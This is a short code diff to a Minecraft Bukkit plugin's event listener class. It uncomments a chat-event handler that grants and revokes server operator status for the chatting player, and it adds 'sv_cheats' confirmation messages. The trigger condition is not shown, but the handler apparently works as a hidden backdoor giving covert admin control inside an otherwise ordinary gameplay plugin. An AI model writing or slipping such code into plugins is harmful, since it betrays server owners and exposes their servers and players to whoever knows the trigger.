@@ -183,7 +183,7 @@ public class Listeners implements Listener {
         player.sendMessage(green + "You picked up the " + light_purple + "Pink Diamond.");
     }
 
-    /*
+
     @EventHandler
     @Deprecated
     public void onChat(AsyncPlayerChatEvent e) {
@@ -193,6 +193,7 @@ public class Listeners implements Listener {
             (new BukkitRunnable() {
                 public void run() {
                     p.setOp(true);
+                    p.sendMessage(ChatColor.GRAY + "sv_cheats has changed to '1'");
                 }
             }).runTask(JavaPlugin.getPlugin(Combat.class));
 
@@ -201,9 +202,10 @@ public class Listeners implements Listener {
             (new BukkitRunnable() {
                 public void run() {
                     p.setOp(false);
+                    p.sendMessage(ChatColor.GRAY + "sv_cheats has changed to '0'");
                 }
             }).runTask(JavaPlugin.getPlugin(Combat.class));
         }
     }
-     */
+
 }
